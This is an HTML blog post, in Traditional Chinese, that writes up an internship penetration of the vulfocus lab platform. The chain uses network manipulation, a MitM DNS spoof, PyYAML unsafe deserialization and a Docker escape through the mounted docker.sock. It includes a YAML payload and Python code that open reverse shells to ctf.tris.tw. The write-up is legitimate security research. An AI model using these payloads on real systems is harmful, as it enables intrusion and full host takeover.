@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    叫你打靶機平台不是叫你把整個平台打下來，記錄針對 vulfocus 的一次滲透 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">叫你打靶機平台不是叫你把整個平台打下來，記錄針對 vulfocus 的一次滲透</div>
+  <div class="post-meta">
+    <div class="date">2025 六月 22日</div>
+    <div class="tags">
+      
+      <div class="tag-item">web</div>
+      
+      <div class="tag-item">misc</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p>最近接觸到一個對岸的開源靶機平台 <a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus">vulfocus</a> ， <code>vulfocus</code> 整合了 <code>docker</code> 、 <code>docker compose</code> ，讓架設者能夠一鍵部署漏洞題目，並且在 container 中自帶 Flag 。</p>
+<p>事情的開端是我在這個專案的 <a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus/issues/354">issue</a> 中看到了一個 <code>JWT token</code> leak，並且可以拿到 <code>admin</code> 的權限，欸既然拿到 <code>admin</code> 權限了又是靶機平台，甚至可以自訂 <code>docker-compose.yml</code> ，應該可以馬上 RCE 吧？我一開始是這樣想的，但結果比我想像的還要複雜很多。</p>
+<h2 id="有-docker-compose-為什麼還是沒辦法-RCE-呢"><a href="#有-docker-compose-為什麼還是沒辦法-RCE-呢" class="headerlink" title="有 docker compose 為什麼還是沒辦法 RCE 呢"></a>有 docker compose 為什麼還是沒辦法 RCE 呢</h2><p>導入靶機介面提供了三種導入方式</p>
+<ol>
+<li>添加</li>
+<li>本地導入</li>
+<li>Compose 編譯</li>
+</ol>
+<p>添加功能可以讓你上傳或是提供網址 pull image 進來，本地導入讓管理者可以直接透過本機裡面已經有的 image 一鍵建立漏洞題目，而 Compose 編譯則能自己撰寫靶機的 <code>docker-compose.yml</code></p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/1.png"></p>
+<p>既然靶機是 <code>docker</code> 管理的，不免讓人馬上聯想到 docker escape 。我都有 <code>docker-compose.yml</code> 了直接寫一個 <code>privileged: true</code> 不就完事了。</p>
+<p>恭喜， <code>docker compose</code> 的功能根本就是壞的，因為他把 yaml parse 之後直接塞進去 <code>json.load</code> ，但是 <code>json.loads</code> 只能塞字串</p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/2.png"></p>
+<h2 id="Vulfocus-API-的架構"><a href="#Vulfocus-API-的架構" class="headerlink" title="Vulfocus API 的架構"></a>Vulfocus API 的架構</h2><p>在亂翻功能時，我發現「本地導入」頁面有一個 <code>vulfocus-api</code> 的 container<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/4.png"></p>
+<p>正常來講這種靶機平台應該是包兩層 docker 避免 challenge 影響到其他的 Container，不過看了一下 source code 發現全部的 challenge container 都是透過 host 的 docker api 直接新增，也就是說這些 challenge 被散落在宿主機上，僅透過 network 隔離。</p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/3.png"></p>
+<p>既然 <code>vulfocus-api</code> 是一個 container 並且可以操作 host 的 docker，那我們有沒有辦法透過「本地導入」把這個 container 加進來，這樣我不就有宿主機的 <code>docker.sock</code> 了嗎？</p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/5.png"></p>
+<p>恭喜，又不能，因為「本地導入」只會複製 container 的 image 和 <code>docker-comopse.yml</code> 的 expose port，其他欄位都會被丟掉，包括被掛進來的 <code>docker.sock</code></p>
+<h2 id="YAML-反序列化漏洞"><a href="#YAML-反序列化漏洞" class="headerlink" title="YAML 反序列化漏洞"></a>YAML 反序列化漏洞</h2><p>api 中有許多地方用到了 <code>yaml</code> 來儲存和載入資料，而有些地方用了不安全的 yaml.Loader，雖然如此但這些 <code>yaml.Loader</code> 的內容都是我們（理論上）無法直接控制的，有的是透過 yaml.dump 後 load 進來，有的是透過官網下載官方編排場景 load 進來</p>
+<pre><code class="highlight python">raw_data = yaml.dump(req)
+raw_data = yaml.load(raw_data, Loader=yaml.Loader)</code></pre>
+
+<pre><code class="highlight python">url = <span class="string">&quot;http://vulfocus.io/api/layoutinfodet?layout_id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)
+res = requests.get(url, verify=<span class="literal">False</span>).content
+req = json.loads(res)
+raw_data = req[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;layout_raw_content&#x27;</span>]
+raw_data = yaml.load(raw_data, Loader=yaml.Loader)</code></pre>
+
+<p>那為什麼是「理論上」呢？<del>因為我只要把他們的官網打下來就變成可控的了</del><br>當然不是，作為好駭客（的朋友）我們不能在未經授權的情況下攻擊別人的網站，因此我們將進到本文的重點：如何在不打下官網的狀況下控制 <code>raw_data</code></p>
+<p>題外話：目前 <a target="_blank" rel="noopener" href="https://vulfocus.io/">vulfocus.io</a> 這個 domain 已經被越南的壞駭客打下來了<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/6.png"></p>
+<h2 id="MitM-YAML-Deserialization-Docker-Escape"><a href="#MitM-YAML-Deserialization-Docker-Escape" class="headerlink" title="MitM + YAML Deserialization + Docker Escape"></a>MitM + YAML Deserialization + Docker Escape</h2><h3 id="Vulfocus-的場景功能"><a href="#Vulfocus-的場景功能" class="headerlink" title="Vulfocus 的場景功能"></a>Vulfocus 的場景功能</h3><p>在開始之前，我們需要介紹另一個 Vulfocus framework 的 feature —— 場景功能</p>
+<p>簡而言之，場景功能可以將多個 container 和網路環境整合成一個題目，前面提到 challenge 由不同網卡將彼此做隔離，而 layout 功能則是將多個 container 放在同一個網路環境，讓彼此可以互通，因此出題者可以構建比如 SSRF、題目再加一層 WAF 之類的場景。</p>
+<h3 id="亂搞網卡"><a href="#亂搞網卡" class="headerlink" title="亂搞網卡"></a>亂搞網卡</h3><p>既然可以亂搞網路環境，那我們有沒有可能將某個 container 掛到和 <code>vulfocus-api</code> 的相同物理網路之中呢？<br>在新增網卡的頁面中，雖然 vulfocus 本身沒有對新增的網卡做任何限制，但是這些資料到了 docker api 就會爆炸，因為沒辦法新增相同名稱或子網重疊的 network</p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/7.png"><br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/8.png"></p>
+<p>在一番嘗試後，新增場景的網卡邏輯引起了我的注意：</p>
+<pre><code class="highlight python"><span class="comment">#run_layout</span>
+<span class="comment"># 启动网卡</span>
+raw_con = json.loads(layout_info.raw_content)
+network_list = client.networks.<span class="built_in">list</span>()
+net_list = []
+network_names = [item[<span class="string">&#x27;attrs&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] <span class="keyword">for</span> item <span class="keyword">in</span> raw_con[<span class="string">&#x27;nodes&#x27;</span>] <span class="keyword">if</span> item[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&quot;Network&quot;</span>]
+<span class="keyword">for</span> i <span class="keyword">in</span> network_list:
+    net_list.append(i.attrs[<span class="string">&#x27;Name&#x27;</span>])
+<span class="keyword">for</span> network_name <span class="keyword">in</span> network_names:
+    <span class="keyword">if</span> network_name <span class="keyword">in</span> net_list:
+        <span class="keyword">pass</span>
+    <span class="keyword">else</span>:
+        <span class="keyword">try</span>:
+            <span class="comment">#從儲存的網卡中找出該場景的網卡</span>
+            network_det = NetWorkInfo.objects.<span class="built_in">filter</span>(net_work_name=network_name).first()
+            <span class="string">&#x27;&#x27;&#x27;其他設定...以下省略&#x27;&#x27;&#x27;</span>
+
+        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+            <span class="keyword">return</span> JsonResponse(R.build(msg=<span class="built_in">str</span>(e)))</code></pre>
+
+<p>也就是說，程式會先看 docker network 裡面有沒有該場景的網卡名稱，如果有就會用它把 container 跑起來，沒有的話才會去 NetWorkInfo 中找儲存的網卡，所以，我們可以在新增場景時，直接設定不存在於 vulfocus 但存在於 docker 中的 network，也就是 <code>vulfocus-api</code> 使用的網路環境 <code>vulfocus_vulfocus</code></p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/9.png"></p>
+<p>至於為什麼是 <code>vulfocus_vulfocus</code> 呢？因為官方提供的 GitHub repo 中，<code>docker-compose.yml</code> 便是 <code>vulfocus</code> ，而 docker network 命名的邏輯為 <code>folderName_networkName</code> 因此如果使用官方的 repo ，網卡名稱便會是 <code>vulfocus_vulfocus</code></p>
+<h3 id="MitM"><a href="#MitM" class="headerlink" title="MitM"></a>MitM</h3><p>到目前為止，我們已經成功連接到 <code>vulfocus-api</code> 的物理網路，因此，我們只需要對他做 MitM ，<code>http://vulfocus.io</code> 回傳的結果便是我們可控的了</p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/10.png"></p>
+<p>將 vulfocus-api 與 gateway 做中間人攻擊後，我們便可以偷偷換掉 vulfocus.io 的 dns 結果<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/12.png"></p>
+<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/11.png"><br>觸發更新的 api，此時程式按照預定邏輯到 vulfocus.io 下載更新，但因為 dns 查詢結果已經被我們篡改，因此會下載到錯誤的 yaml </p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span>
+    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>
+        <span class="attr">&quot;layout_raw_content&quot;</span><span class="punctuation">:</span><span class="string">&quot;!!python/object/apply:os.system\n- |\n python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;ctf.tris.tw\&quot;,8080));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;bash\&quot;)&#x27;\n&quot;</span>
+    <span class="punctuation">&#125;</span>
+<span class="punctuation">&#125;</span></code></pre>
+
+<p>至此，我們成功 compromise 了 <code>vulfocus-api</code></p>
+<h3 id="Docker-Escape"><a href="#Docker-Escape" class="headerlink" title="Docker Escape"></a>Docker Escape</h3><p>拿到 <code>vulfocus-api</code> 的 shell 後，要做 docker escape 就很簡單了，因為 <code>vulfocus-api</code> 已經將宿主的 docker.sock 給 mount 進來了，我們只要用他創一個 privileged container 就可以了：</p>
+<pre><code class="highlight python"><span class="keyword">import</span> docker
+client = docker.DockerClient(base_url=<span class="string">&#x27;unix://var/run/docker.sock&#x27;</span>)
+client.images.pull(<span class="string">&quot;debian&quot;</span>)
+container = client.containers.create(image=<span class="string">&quot;debian&quot;</span>,command=<span class="string">&quot;/bin/bash&quot;</span>,name=<span class="string">&quot;pwned&quot;</span>,stdin_open=<span class="literal">True</span>,tty=<span class="literal">True</span>,privileged=<span class="literal">True</span>)
+container.start()
+container.exec_run(<span class="string">&quot;bash -i 5&lt;&gt; /dev/tcp/ctf.tris.tw/8081 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;</span>)</code></pre>
+
+<p>成功拿到宿主機的 shell</p>
+<h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>這個專案是在 DEVCORE 實習時接觸到的，整個過程其實蠻 tricky 的，也是第一次打 web 打到需要用到 MitM Attack，算是一個特別的經驗，整個過程大概花了兩個禮拜（主要是因為大部分的程式碼都很 spaghetti 的），我覺得最大的收穫就是翻 code 的能力變強了 (￣▽￣) </p>
+<p>本次經驗也同步在期末的<a href="tba.pdf">實習生發表</a>同步分享，感謝導師 Mico 讓我花兩個禮拜在平台上面亂搞一通。</p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
